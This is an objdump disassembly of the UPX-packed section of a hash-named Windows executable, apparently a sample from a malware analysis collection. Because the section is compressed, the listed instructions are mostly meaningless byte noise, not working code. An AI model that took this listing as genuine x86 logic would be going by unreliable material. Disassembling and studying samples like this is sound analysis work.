
1ab53d768d00f8b3100a9132efb7a4a7731417ee0b2c53bba283d7d9db906b06.exe:     file format pei-i386


Disassembly of section UPX1:

00429000 <UPX1>:
  429000:	sbb    al,BYTE PTR [ebx]
  429002:	add    BYTE PTR [ebx+0x20],dl
  429005:	inc    edi
  429006:	push   es
  429007:	loopne 0x429088
  429009:	jne    0x429025
  42900b:	into   
  42900c:	ins    DWORD PTR es:[edi],dx
  42900d:	shl    DWORD PTR [esi-0x20ed2ef3],0x7b
  429014:	stos   BYTE PTR es:[edi],al
  429015:	jno    0x429003
  429017:	sub    al,0x68
  429019:	jae    0x429030
  42901b:	cwde   
  42901c:	sub    eax,0x9da02623
  429021:	push   ebp
  429022:	push   0x62ef8a75
  429027:	scas   eax,DWORD PTR es:[edi]
  429028:	mov    esi,0x72ba93c5
  42902d:	or     bh,ah
  42902f:	mov    cl,0xd7
  429031:	xor    eax,ecx
  429033:	mov    dx,0x1171
  429037:	xchg   edx,eax
  429038:	div    DWORD PTR [eax-0x58]
  42903b:	or     DWORD PTR [eax-0x17],eax
  42903e:	push   esi
  42903f:	or     DWORD PTR [eax-0x759ceecf],0x64
  429046:	dec    eax
  429047:	hlt    
  429048:	shl    dl,cl
  42904a:	xchg   esi,eax
  42904b:	jmp    0x429081
  42904d:	pop    ebx
  42904e:	ds jecxz 0x429009
  429051:	mov    dh,0xa0
  429053:	jge    0x42900d
  429055:	dec    ebp
  429056:	push   ebp
  429057:	inc    ebx
  429058:	test   al,0xf8
  42905a:	inc    ecx
  42905b:	fdivp  st(6),st
  42905d:	cdq    
  42905e:	sbb    cl,BYTE PTR [edx+edi*1+0x1b]
  429062:	scas   eax,DWORD PTR es:[edi]
  429063:	jg     0x42909e
  429065:	(bad)  
  429066:	std    
  429067:	adc    dl,BYTE PTR [edi+0x35]
  42906a:	mov    cl,0x2e
  42906c:	sbb    dh,BYTE PTR [ecx+0x1b]
  42906f:	es gs and eax,0x7e1207cf
  429076:	call   0xbff66adf
  42907b:	dec    ebp
  42907c:	cmp    BYTE PTR ds:0xb9561fd1,0xd8
  429083:	push   ecx
  429084:	push   cs
  429085:	call   0x7a378831
  42908a:	inc    esi
  42908b:	dec    esi
  42908c:	iret   
  42908d:	mov    ch,0x6c
  42908f:	idiv   DWORD PTR [eax]
  429091:	mov    bh,0x32
  429093:	mov    ah,BYTE PTR ds:0xf84ad566
  429099:	jnp    0x4290b6
  42909b:	arpl   WORD PTR [ebx-0x72],bp
  42909e:	mov    ebp,0xe8035b98
  4290a3:	mov    WORD PTR ds:0x25c583ce,ds
  4290a9:	mov    ds:0x4bc074e1,eax
  4290ae:	jmp    0x1f6fc074
  4290b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4290b4:	jmp    0xe84d:0xbfc02b69
  4290bb:	stos   BYTE PTR es:[edi],al
  4290bc:	or     eax,0x1101edf1
  4290c1:	mov    ds:0xf09d9508,eax
  4290c6:	xchg   BYTE PTR ds:[eax],ch
  4290c9:	dec    edx
  4290ca:	data16 jno 0x42908d
  4290cd:	pop    es
  4290ce:	stos   DWORD PTR es:[edi],eax
  4290cf:	pop    edx
  4290d0:	lea    ecx,[eax+eax*1-0x3f513fde]
  4290d7:	inc    esp
  4290d8:	fcmove st,st(7)
  4290da:	daa    
  4290db:	mov    DWORD PTR [edi-0x136cd7a4],esi
  4290e1:	and    bh,al
  4290e3:	mov    esi,0x3f7a37eb
  4290e8:	mov    dh,0x89
  4290ea:	pop    edi
  4290eb:	xor    eax,esi
  4290ed:	retf   0xaef
  4290f0:	imul   ecx,DWORD PTR fs:[esi],0xe1da8fe9
  4290f7:	fnstenv [ecx+0x6bfa48c4]
  4290fd:	or     ah,ah
  4290ff:	jo     0x42916f
  429101:	fimul  WORD PTR [esi]
  429103:	inc    esi
  429104:	and    eax,0xae150489
  429109:	pop    es
  42910a:	bound  esp,QWORD PTR [eax+0x7eddf021]
  429110:	retf   
  429111:	pop    edx
  429112:	xor    eax,0xd9288560
  429117:	pop    ss
  429118:	les    esp,FWORD PTR [ebx-0x28]
  42911b:	push   ecx
  42911c:	xor    al,0xd8
  42911e:	addr16 xchg edx,eax
  429120:	ja     0x429119
  429122:	stos   BYTE PTR es:[edi],al
  429123:	retf   
  429124:	jne    0x429149
  429126:	loope  0x429155
  429128:	call   0xd3cd23df
  42912d:	test   eax,0xa9663506
  429132:	jle    0x42912e
  429134:	sti    
  429135:	pushf  
  429136:	cmp    eax,0x9e748da8
  42913b:	iret   
  42913c:	push   ecx
  42913d:	lea    esi,[edx+0x6cfc5d57]
  429143:	dec    esi
  429144:	inc    edx
  429145:	les    ebx,FWORD PTR [ebx-0x44]
  429148:	sub    DWORD PTR [esp+ebx*2-0x52],edi
  42914c:	mov    esp,0x50674fc6
  429151:	imul   ebp,ebx,0x3edf3cb1
  429157:	ins    BYTE PTR es:[edi],dx
  429158:	jmp    0x429196
  42915a:	push   0x7a25821
  42915f:	sub    dh,ah
  429161:	xor    al,0x7a
  429163:	test   BYTE PTR [ecx+0x53],0xdd
  429167:	jb     0x429132
  429169:	xchg   ebx,eax
  42916a:	or     al,dl
  42916c:	loope  0x429159
  42916e:	ds das 
  429170:	xlat   BYTE PTR ds:[ebx]
  429171:	stos   BYTE PTR es:[edi],al
  429172:	cmp    bh,BYTE PTR [esi+0x15234a1a]
  429178:	fisttp QWORD PTR ds:0x8bc0bec5
  42917e:	xchg   DWORD PTR [esi-0x17549178],ebx
  429184:	arpl   dx,sp
  429186:	stos   BYTE PTR es:[edi],al
  429187:	xchg   ebx,eax
  429188:	adc    DWORD PTR [esp+ebp*4-0x22],esi
  42918c:	cmp    BYTE PTR [ebx],dl
  42918e:	pop    ebp
  42918f:	sbb    edi,DWORD PTR gs:[ebx]
  429192:	sbb    BYTE PTR [ebp+0x719b2646],ah
  429198:	pop    esi
  429199:	imul   esp,DWORD PTR [ebx],0xffffffd4
  42919c:	mov    ebx,0xfbc50c23
  4291a1:	jno    0x42919f
  4291a3:	and    al,0x4f
  4291a5:	cmp    ch,BYTE PTR [ebx]
  4291a7:	push   esi
  4291a8:	cli    
  4291a9:	jmp    0xbb94:0xf326f470
  4291b0:	les    ebx,FWORD PTR [ebx-0x38]
  4291b3:	jecxz  0x42922b
  4291b5:	ret    0x8f51
  4291b8:	mov    WORD PTR [eax],?
  4291ba:	and    al,0x88
  4291bc:	ja     0x42919f
  4291be:	add    DWORD PTR [edi+ebx*2+0x27],ebp
  4291c2:	shr    DWORD PTR [ecx],0x49
  4291c5:	je     0x42922f
  4291c7:	jbe    0x42914e
  4291c9:	mov    ds:0x1aac169c,al
  4291ce:	aam    0xa5
  4291d0:	lods   al,BYTE PTR ds:[esi]
  4291d1:	xchg   ebx,eax
  4291d2:	(bad)  
  4291d3:	mov    ch,0xc1
  4291d5:	pop    ecx
  4291d6:	pop    edi
  4291d7:	sub    dh,BYTE PTR [ebp+ebp*8+0x697d1ae0]
  4291de:	cmp    eax,0xfc7099a
  4291e3:	fucom  st(0)
  4291e5:	adc    BYTE PTR [edi+edi*8+0x69],cl
  4291e9:	jne    0x42920e
  4291eb:	shl    DWORD PTR [edx-0x748f2e4a],cl
  4291f1:	sti    
  4291f2:	dec    ecx
  4291f3:	ds dec esi
  4291f5:	popf   
  4291f6:	call   0x6efb:0x565925a5
  4291fd:	into   
  4291fe:	cmp    BYTE PTR ds:0xc115c81f,bl
  429204:	sbb    eax,esp
  429206:	xchg   ebp,eax
  429207:	push   eax
  429208:	repnz dec edx
  42920a:	dec    edi
  42920b:	dec    edi
  42920c:	imul   esp,DWORD PTR [eax+0x22528f06],0x3373d0c1
  429216:	adc    BYTE PTR [ecx-0x31],ch
  429219:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42921a:	stc    
  42921b:	mov    esi,DWORD PTR [ebp+0x5b]
  42921e:	(bad)  
  429220:	loopne 0x4291a2
  429222:	pop    esp
  429223:	scas   eax,DWORD PTR es:[edi]
  429224:	fidiv  DWORD PTR [edx+0x63b43369]
  42922a:	and    esp,DWORD PTR [edi-0x76]
  42922d:	cli    
  42922e:	cmp    ch,dl
  429230:	mov    edx,0x4a5617be
  429235:	sahf   
  429236:	mov    gs,WORD PTR es:0x56db8ab4
  42923d:	mov    ebx,DWORD PTR [esi-0x7d]
  429240:	dec    edx
  429241:	push   ss
  429242:	jmp    0x1159779c
  429247:	xchg   esp,eax
  429248:	adc    eax,0xe59c5187
  42924d:	sbb    al,0x8e
  42924f:	icebp  
  429250:	dec    eax
  429251:	outs   dx,BYTE PTR ds:[esi]
  429252:	ins    BYTE PTR es:[edi],dx
  429253:	les    edx,FWORD PTR [ecx+esi*8+0xf]
  429257:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429258:	mov    edx,0x52a3aa1c
  42925d:	inc    ebp
  42925e:	add    eax,0xa73f2286
  429263:	pop    ecx
  429264:	pop    esp
  429265:	test   DWORD PTR [ebp+0x7c],ebx
  429268:	test   DWORD PTR [edi],ecx
  42926a:	fcomp  DWORD PTR [edx+0x43]
  42926d:	icebp  
  42926e:	mov    ?,WORD PTR [esi+0x695a4201]
  429274:	mov    dl,0x75
  429276:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429277:	test   DWORD PTR [ecx],ebx
  429279:	xchg   esi,eax
  42927a:	call   0x2430:0x1b6d5d8
  429281:	fistp  WORD PTR [edi]
  429283:	jle    0x42924f
  429285:	xor    cl,al
  429287:	scas   eax,DWORD PTR es:[edi]
  429288:	imul   esi,DWORD PTR [ecx-0x5c855165],0x4a
  42928f:	ror    BYTE PTR [ebx],1
  429291:	outs   dx,DWORD PTR ds:[esi]
  429292:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429293:	loope  0x429298
  429295:	sbb    BYTE PTR [ecx+edx*2-0x45],dh
  429299:	push   ss
  42929a:	mov    esp,0xcfd60f05
  42929f:	lock test DWORD PTR [ecx+0x2d],esi
  4292a3:	iret   
  4292a4:	push   cs
  4292a5:	adc    ebx,DWORD PTR [eax]
  4292a7:	pop    edi
  4292a8:	in     al,0x90
  4292aa:	mov    bh,0xdc
  4292ac:	clc    
  4292ad:	and    ecx,DWORD PTR [ecx]
  4292af:	xor    BYTE PTR [edi+0x11],bl
  4292b2:	rcr    BYTE PTR [ebp-0x68],cl
  4292b5:	cmp    al,0x34
  4292b7:	sub    DWORD PTR [ecx-0x6],ebx
  4292ba:	jnp    0x429326
  4292bc:	cwde   
  4292bd:	xchg   edx,eax
  4292be:	je     0x429313
  4292c0:	inc    ebx
  4292c1:	mov    ecx,0x72afe0f4
  4292c6:	mov    ebp,0x37a24169
  4292cb:	call   0xda51287f
  4292d0:	pop    ebx
  4292d1:	loope  0x4292f8
  4292d3:	outs   dx,BYTE PTR ds:[esi]
  4292d4:	sub    al,0xf2
  4292d6:	and    DWORD PTR ds:0xe98a7e8b,ebp
  4292dc:	hlt    
  4292dd:	test   BYTE PTR [ebx+0x4b933065],0xb2
  4292e4:	pop    ds
  4292e5:	xchg   DWORD PTR [ebp+0x4e02bc0f],ecx
  4292eb:	push   esi
  4292ec:	inc    ecx
  4292ed:	ds sbb eax,0x2aeb1ab2
  4292f3:	or     ch,BYTE PTR [eax+0x50f21a5a]
  4292f9:	sahf   
  4292fa:	or     esi,DWORD PTR [ebp+0x1814465]
  429300:	dec    ecx
  429301:	fldenv [edi+0x7d]
  429304:	(bad)  [ebx+0x5236f56e]
  42930a:	popa   
  42930b:	push   0xae1db44d
  429310:	jmp    0x7d80ceff
  429315:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429316:	mov    ebp,DWORD PTR [esi]
  429318:	call   0x6378118
  42931d:	rcl    BYTE PTR [ecx-0x67325e83],1
  429323:	jns    0x429351
  429325:	not    DWORD PTR [edx+edx*1-0x39b9aab8]
  42932c:	loope  0x429368
  42932e:	fsubr  DWORD PTR [eax-0x46]
  429331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429332:	nop
  429333:	rcr    DWORD PTR [eax],cl
  429335:	cmp    al,dh
  429337:	or     al,0xb4
  429339:	mov    ah,0x76
  42933b:	arpl   WORD PTR [ebp+0x39a0bad],cx
  429341:	push   DWORD PTR [esi+ecx*4-0x538ea02f]
  429348:	les    ebx,FWORD PTR [ebx+0x3e04f462]
  42934e:	test   al,0x59
  429350:	scas   eax,DWORD PTR es:[edi]
  429351:	jl     0x429365
  429353:	jns    0x4292e9
  429355:	cmp    DWORD PTR [esi-0x26733c0e],ebx
  42935b:	out    0x18,al
  42935d:	xchg   ebp,eax
  42935e:	xchg   edx,eax
  42935f:	call   0x5cb0eb5e
  429364:	adc    cl,0x6c
  429367:	jecxz  0x42935d
  429369:	dec    ebx
  42936a:	dec    ecx
  42936b:	push   edx
  42936c:	aad    0x76
  42936e:	jl     0x429395
  429370:	neg    esi
  429372:	xor    BYTE PTR [ecx],dh
  429374:	stos   DWORD PTR es:[edi],eax
  429375:	mov    ecx,0xcc486868
  42937a:	or     BYTE PTR [eax],0x2a
  42937d:	dec    eax
  42937e:	mov    ebp,0x353aa627
  429383:	in     al,0x59
  429385:	jne    0x429373
  429387:	xor    eax,0x97168ecd
  42938c:	jo     0x429369
  42938e:	jne    0x4293d0
  429390:	mov    dh,0xa5
  429392:	inc    esp
  429393:	push   eax
  429394:	or     BYTE PTR [ebx+0x565126c8],ah
  42939a:	sahf   
  42939b:	xchg   esi,eax
  42939c:	add    al,0x79
  42939e:	adc    eax,edi
  4293a0:	cmp    esp,ebp
  4293a2:	nop
  4293a3:	push   0xf29af0e
  4293a8:	(bad)  
  4293aa:	scas   al,BYTE PTR es:[edi]
  4293ab:	dec    eax
  4293ac:	lahf   
  4293ad:	push   esp
  4293ae:	ins    BYTE PTR es:[edi],dx
  4293af:	cmp    al,0xd5
  4293b1:	dec    ebx
  4293b2:	nop
  4293b3:	xchg   ebp,eax
  4293b4:	add    eax,0xd9892dac
  4293b9:	and    eax,0xdc6d778
  4293be:	cmp    al,0x4
  4293c0:	inc    esp
  4293c1:	fcomip st,st(7)
  4293c3:	sbb    edi,DWORD PTR [ecx]
  4293c5:	push   ecx
  4293c6:	outs   dx,DWORD PTR ds:[esi]
  4293c7:	dec    edi
  4293c8:	(bad)  
  4293c9:	mov    ah,0x95
  4293cb:	push   ebp
  4293cc:	sti    
  4293cd:	not    DWORD PTR [ecx+0x70]
  4293d0:	nop
  4293d1:	sub    dl,dh
  4293d3:	comiss xmm7,xmm6
  4293d6:	mov    esi,0xec7033bd
  4293db:	mov    dh,0x35
  4293dd:	xor    DWORD PTR [edi+0x4272a501],edx
  4293e3:	mov    bl,0xbb
  4293e5:	pop    ss
  4293e6:	add    eax,0x352ca118
  4293eb:	mov    esi,0x371de649
  4293f0:	dec    al
  4293f2:	add    al,0xd9
  4293f4:	ja     0x429413
  4293f6:	adc    eax,DWORD PTR [edx]
  4293f8:	pop    edx
  4293f9:	test   al,0x48
  4293fb:	and    bh,bl
  4293fd:	inc    DWORD PTR [edx+0x25]
  429400:	add    eax,0x538b89ec
  429405:	daa    
  429406:	push   ebp
  429407:	or     BYTE PTR [edx],ch
  429409:	icebp  
  42940a:	outs   dx,DWORD PTR ds:[esi]
  42940b:	and    ah,BYTE PTR [edi+0x76ed31af]
  429411:	mov    eax,0x3af35e82
  429416:	in     al,dx
  429417:	sbb    eax,0x79e91b8f
  42941c:	mov    dl,0x55
  42941e:	adc    dh,bh
  429420:	jo     0x429468
  429422:	ja     0x429481
  429424:	adc    eax,0xa0a495fc
  429429:	mov    al,ds:0xdd5d65b2
  42942e:	(bad)  
  42942f:	shl    DWORD PTR [edi],cl
  429431:	dec    ebx
  429432:	fst    QWORD PTR [ecx+edx*2]
  429435:	rcl    ebp,cl
  429437:	push   edx
  429438:	jmp    0xc2992e72
  42943d:	adc    DWORD PTR [edx],0xffffffea
  429440:	xchg   edx,eax
  429442:	iret   
  429443:	hlt    
  429444:	inc    ecx
  429445:	dec    ecx
  429446:	xor    bh,al
  429448:	mov    ebx,0x1289558b
  42944d:	neg    BYTE PTR [edi-0x52]
  429450:	stc    
  429451:	call   0xaad6:0x13de4ed6
  429458:	cmp    al,0x2a
  42945a:	ins    BYTE PTR es:[edi],dx
  42945b:	mul    DWORD PTR [ebp-0x1b]
  42945e:	xor    DWORD PTR [eax],0xac929d7
  429464:	rol    BYTE PTR [ecx-0x2444428d],cl
  42946a:	mov    edi,0x977843b4
  42946f:	(bad)  
  429470:	cli    
  429471:	xor    DWORD PTR [ebx-0x6],ebp
  429474:	or     edx,esi
  429476:	jg     0x42941e
  429478:	loopne 0x42947e
  42947a:	mov    ecx,0x2b7b072e
  42947f:	and    eax,0xfc81e12
  429484:	xchg   esi,eax
  429485:	mov    edx,ebx
  429487:	push   ebp
  429488:	ins    BYTE PTR es:[edi],dx
  429489:	add    DWORD PTR [ebx],ebx
  42948b:	sbb    bl,BYTE PTR [esi+ebp*4+0x208715cc]
  429492:	int    0xcc
  429494:	dec    esi
  429495:	daa    
  429496:	jge    0x429471
  429498:	jmp    0x429494
  42949a:	(bad)  
  42949b:	mov    ds:0x99e3d499,eax
  4294a0:	cwde   
  4294a1:	sub    BYTE PTR es:[ecx],bh
  4294a4:	retf   0xc2c9
  4294a7:	cmp    DWORD PTR [edx+0x74cb7151],ecx
  4294ad:	adc    ecx,0xffffff9a
  4294b0:	add    eax,0x736e8ccb
  4294b5:	push   ebx
  4294b6:	pop    ecx
  4294b7:	mov    WORD PTR [edi+0x4f949a34],fs
  4294bd:	pop    edx
  4294be:	js     0x4294ff
  4294c0:	pop    eax
  4294c1:	(bad)  
  4294c2:	loopne 0x429530
  4294c4:	jg     0x42950b
  4294c6:	mov    al,0x1
  4294c8:	fcomp  DWORD PTR [edi+0x15]
  4294cb:	lock push cs
  4294cd:	test   eax,0x59a8dd4
  4294d2:	mov    BYTE PTR cs:[ebp+esi*8-0xf],ah
  4294d7:	push   ebp
  4294d8:	jns    0x429494
  4294da:	push   esp
  4294db:	sub    ebx,DWORD PTR [ebx+0x33]
  4294de:	adc    bh,bl
  4294e0:	jne    0x429517
  4294e2:	sub    bl,dh
  4294e4:	call   0x1fafe47c
  4294e9:	stc    
  4294ea:	int    0x7a
  4294ec:	push   0x2b
  4294ee:	out    dx,eax
  4294ef:	cdq    
  4294f0:	cdq    
  4294f1:	sub    BYTE PTR [esi+eiz*4],0xb0
  4294f5:	and    DWORD PTR [eax],edi
  4294f7:	dec    eax
  4294f8:	pop    ss
  4294f9:	xchg   ecx,eax
  4294fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4294fb:	(bad)  
  4294fc:	cli    
  4294fd:	sub    dl,BYTE PTR [edi*8-0x30827606]
  429504:	xlat   BYTE PTR ds:[ebx]
  429505:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429506:	adc    BYTE PTR [ebx+0x22],dl
  429509:	mov    esi,esi
  42950b:	xor    esp,DWORD PTR [edx-0xe]
  42950e:	push   ecx
  42950f:	fimul  DWORD PTR [esi]
  429511:	mov    bl,0xf2
  429513:	repnz and DWORD PTR [ecx-0xc0c8287],ebp
  42951a:	in     eax,0xe8
  42951c:	mov    dl,0xfb
  42951e:	xor    ch,ch
  429520:	call   0x9013:0x5534e65c
  429527:	cmp    ebx,esp
  429529:	mov    ss,WORD PTR [ebp+0x4a]
  42952c:	mov    ds:0xbf6cbbfb,eax
  429531:	mov    cl,0xaf
  429533:	add    ebp,DWORD PTR [eax-0x7b3b37ac]
  429539:	outs   dx,DWORD PTR ds:[esi]
  42953a:	push   ebx
  42953b:	jmp    0x42959f
  42953d:	stc    
  42953e:	push   eax
  42953f:	xor    WORD PTR [edi+0x364a5ad9],sp
  429546:	push   edx
  429547:	or     ecx,DWORD PTR [edx+edi*2-0x5e]
  42954b:	push   esp
  42954c:	ins    DWORD PTR es:[edi],dx
  42954d:	mov    bl,0xc6
  42954f:	mul    DWORD PTR [ecx]
  429551:	xchg   DWORD PTR [ebp-0x7e],edi
  429554:	(bad)  
  429555:	mov    esp,0xe36e276d
  42955a:	pushf  
  42955b:	sub    DWORD PTR [edi],esp
  42955d:	test   BYTE PTR [edi-0x2380c243],al
  429563:	mov    ?,edi
  429565:	inc    esi
  429566:	fldcw  WORD PTR [ebx-0x706c6f22]
  42956c:	or     BYTE PTR [edi+0x2f],al
  42956f:	aas    
  429570:	inc    ebp
  429571:	not    BYTE PTR [ebx-0x6bcee4ee]
  429577:	xor    ebp,DWORD PTR [ecx+ecx*1]
  42957a:	popa   
  42957b:	sub    bh,dl
  42957d:	cmp    DWORD PTR [esp+edi*4+0x43923716],esp
  429584:	sub    al,0xd7
  429586:	adc    edi,DWORD PTR [edi-0x292f84ae]
  42958c:	mov    ds,edi
  42958e:	loop   0x429523
  429590:	ret    0xb015
  429593:	pop    ecx
  429594:	sub    eax,DWORD PTR [edx]
  429596:	stos   BYTE PTR es:[edi],al
  429597:	test   eax,0xf5d3b271
  42959c:	dec    edx
  42959d:	xor    esp,DWORD PTR [ecx-0x545254c7]
  4295a3:	in     eax,dx
  4295a4:	cmp    BYTE PTR [ecx+0xc],bl
  4295a7:	out    0xaa,eax
  4295a9:	adc    DWORD PTR [edi-0x5fa644f8],edx
  4295af:	sbb    eax,0xc9033135
  4295b4:	scas   eax,DWORD PTR es:[edi]
  4295b5:	fcomp  DWORD PTR [ebp+0x3f8d477f]
  4295bb:	inc    ecx
  4295bc:	outs   dx,BYTE PTR ds:[esi]
  4295bd:	out    dx,eax
  4295be:	cdq    
  4295bf:	pop    esp
  4295c0:	ficomp WORD PTR ds:0xb0341b8c
  4295c6:	sahf   
  4295c7:	sbb    edx,ecx
  4295c9:	leave  
  4295ca:	dec    ebx
  4295cb:	outs   dx,BYTE PTR ds:[esi]
  4295cc:	push   ebx
  4295cd:	sub    dh,BYTE PTR [eax]
  4295cf:	faddp  st(7),st
  4295d1:	inc    ebp
  4295d2:	lods   eax,DWORD PTR ds:[esi]
  4295d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4295d4:	nop
  4295d5:	neg    edx
  4295d7:	jecxz  0x429588
  4295d9:	dec    ebx
  4295da:	jb     0x429560
  4295dc:	add    eax,0xbdf04b94
  4295e1:	stos   DWORD PTR es:[edi],eax
  4295e2:	in     al,dx
  4295e3:	jle    0x4295ca
  4295e5:	mov    al,0x7c
  4295e8:	add    BYTE PTR [ebx],cl
  4295ea:	stc    
  4295eb:	xchg   ebx,eax
  4295ec:	mov    edi,0xbd5fa6c4
  4295f1:	iret   
  4295f2:	xchg   ch,dl
  4295f4:	mov    bl,0x6d
  4295f6:	push   0x8dce4d5e
  4295fb:	adc    BYTE PTR ds:0x352cd150,cl
  429601:	jno    0x429639
  429603:	clc    
  429604:	push   es
  429605:	cld    
  429606:	outs   dx,DWORD PTR ds:[esi]
  429607:	out    0x58,al
  429609:	xchg   ecx,eax
  42960a:	mov    dl,0x5d
  42960c:	mov    ebp,0x2b4ec75
  429611:	add    ebx,DWORD PTR [ebx-0x69]
  429614:	in     al,dx
  429615:	mov    ecx,0x59f1c071
  42961a:	add    BYTE PTR [esi],ah
  42961c:	retf   
  42961d:	test   al,0xeb
  42961f:	xor    al,0xfd
  429621:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429622:	mov    DWORD PTR [esi-0x5a9c0eff],ebx
  429628:	xlat   BYTE PTR ds:[ebx]
  429629:	int3   
  42962a:	loop   0x429605
  42962c:	call   0xeb10:0x12c5e4ad
  429633:	sti    
  429634:	aas    
  429635:	fs call 0x3e0a:0x62b3f020
  42963d:	cld    
  42963e:	xchg   edi,eax
  42963f:	mov    esp,0x58c68147
  429644:	or     eax,0x58d78938
  429649:	popf   
  42964a:	adc    al,0xb0
  42964c:	pop    ds
  42964d:	aaa    
  42964e:	add    BYTE PTR [esi-0x798f4bd7],ch
  429654:	addr16 jmp 0xe4b2:0xf8f8ad06
  42965c:	mov    DWORD PTR [eax+eiz*4],esi
  42965f:	add    BYTE PTR [edi-0x618225c8],dh
  429665:	fwait
  429666:	addr16 sbb cl,bl
  429669:	cmp    esi,DWORD PTR [esi-0x43]
  42966c:	sub    ebp,ecx
  42966e:	arpl   WORD PTR [esi+esi*4-0x18],sp
  429672:	cs jno 0x4296f1
  429675:	push   0xffffffbc
  429677:	and    DWORD PTR [ebx+0x354cdcca],esi
  42967d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42967e:	lea    edi,[ebp-0x65]
  429681:	pusha  
  429682:	(bad)  
  429684:	xchg   ebx,eax
  429685:	loope  0x42961a
  429687:	leave  
  429688:	inc    esp
  429689:	arpl   WORD PTR [ebx-0x45],dx
  42968c:	mov    edx,0xb35aa8e6
  429691:	leave  
  429692:	fwait
  429693:	and    dh,BYTE PTR ds:0xfffb39d6
  429699:	lea    ebx,[edi]
  42969b:	hlt    
  42969c:	call   0x8467a78a
  4296a1:	lea    ebp,[ecx-0x17601d89]
  4296a7:	sbb    eax,0xbeb63b55
  4296ac:	mov    al,0x46
  4296ae:	jne    0x429684
  4296b0:	push   eax
  4296b1:	enter  0xd1c2,0xa1
  4296b5:	push   esp
  4296b6:	xchg   esp,eax
  4296b7:	push   ss
  4296b8:	je     0x429661
  4296ba:	dec    ebx
  4296bb:	sahf   
  4296bc:	mov    edi,0xa6697ee2
  4296c1:	out    0x90,al
  4296c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4296c4:	fbstp  TBYTE PTR [esp+edi*2+0x5a52075e]
  4296cb:	jmp    0xa8aa:0x6c260469
  4296d2:	pusha  
  4296d3:	scas   al,BYTE PTR es:[edi]
  4296d4:	out    0x2a,al
  4296d6:	clc    
  4296d7:	add    dl,BYTE PTR [eax+ebx*4+0x1f]
  4296db:	push   es
  4296dc:	sahf   
  4296dd:	push   0xd4deb8c5
  4296e2:	addr16 sub al,0xd0
  4296e5:	popf   
  4296e6:	cmp    eax,0x26239c27
  4296eb:	xor    eax,0xd0dc5a00
  4296f0:	sub    ah,cl
  4296f2:	sub    eax,0xde0e3428
  4296f7:	das    
  4296f8:	xchg   DWORD PTR [edi-0x72],ecx
  4296fb:	jns    0x42970a
  4296fd:	sahf   
  4296fe:	xchg   DWORD PTR [edi],esp
  429700:	add    al,0x8e
  429702:	arpl   cx,bx
  429704:	jo     0x42977e
  429706:	test   al,0x2c
  429708:	rcr    ah,cl
  42970a:	jmp    0x5a0dc6c2
  42970f:	and    eax,0x8db0b344
  429714:	fsubr  QWORD PTR ds:[ecx-0x4b]
  429718:	aad    0x31
  42971a:	loope  0x4296e5
  42971c:	stc    
  42971d:	xchg   ebx,eax
  42971e:	jb     0x42972c
  429720:	mov    ecx,0x3e7e9101
  429725:	mov    esp,0xd7aebbeb
  42972a:	repnz iret 
  42972c:	pop    ss
  42972d:	cdq    
  42972e:	jecxz  0x429763
  429730:	dec    ebx
  429731:	push   DWORD PTR [edi]
  429733:	dec    edi
  429734:	ins    DWORD PTR es:[edi],dx
  429735:	pop    esi
  429736:	sub    eax,0x91a4aedb
  42973b:	mov    al,ds:0x5072f2fd
  429740:	pop    ds
  429741:	ss adc eax,0xa0d63815
  429747:	fist   DWORD PTR [edi+0x7]
  42974a:	cmp    eax,0xdf62bb6
  42974f:	test   eax,esi
  429751:	in     al,0xe4
  429753:	ins    DWORD PTR es:[di],dx
  429755:	aam    0xf1
  429757:	in     eax,dx
  429758:	pusha  
  429759:	or     al,0xf9
  42975b:	pushf  
  42975c:	jo     0x429759
  42975e:	js     0x4297aa
  429760:	data16 ins BYTE PTR es:[edi],dx
  429762:	test   DWORD PTR [ecx],0x5be82400
  429768:	push   ebp
  429769:	xor    DWORD PTR [edx],edi
  42976b:	jge    0x429764
  42976d:	mov    eax,ds:0xc3105980
  429772:	nop
  429773:	cmp    DWORD PTR [ecx-0x3a],esi
  429776:	mov    bh,0x97
  429778:	jo     0x4297f1
  42977a:	pop    edx
  42977b:	ins    BYTE PTR es:[edi],dx
  42977c:	jle    0x429782
  42977e:	jo     0x42970a
  429780:	cld    
  429781:	cli    
  429782:	loop   0x4297c8
  429784:	cmp    al,BYTE PTR [edi]
  429786:	sub    eax,0x6ec15010
  42978b:	lods   al,BYTE PTR ds:[esi]
  42978c:	arpl   WORD PTR [esi-0x71fcac10],si
  429792:	jno    0x42973c
  429794:	adc    eax,0x1d95446e
  429799:	dec    dx
  42979b:	push   ds
  42979c:	pop    ebp
  42979d:	sub    DWORD PTR [edx-0x67],ecx
  4297a0:	cwde   
  4297a1:	lods   eax,DWORD PTR ds:[esi]
  4297a2:	mov    eax,0xba3f144c
  4297a7:	iret   
  4297a8:	cwde   
  4297a9:	jno    0xa160dbf7
  4297af:	inc    esi
  4297b0:	jae    0x4297eb
  4297b2:	mov    WORD PTR [eax],?
  4297b4:	aam    0xce
  4297b6:	mov    edx,0xd64c1e4e
  4297bb:	xor    dl,BYTE PTR [ecx-0x38]
  4297be:	cmp    esi,DWORD PTR [edx]
  4297c0:	mov    fs,ebx
  4297c2:	repz mov edx,0x36e41666
  4297c8:	or     edi,esi
  4297ca:	xor    BYTE PTR [ecx+0x50],dh
  4297cd:	call   FWORD PTR [ecx-0x72277198]
  4297d3:	add    DWORD PTR [eax+ebx*8-0x5],edi
  4297d7:	inc    eax
  4297d8:	out    dx,al
  4297d9:	icebp  
  4297da:	sub    eax,0x9ced2688
  4297df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4297e0:	xchg   edx,eax
  4297e1:	xchg   esp,eax
  4297e2:	or     edi,eax
  4297e4:	out    0x9,al
  4297e6:	in     al,dx
  4297e7:	push   0x6fe7ba9e
  4297ec:	pop    ebx
  4297ed:	in     al,dx
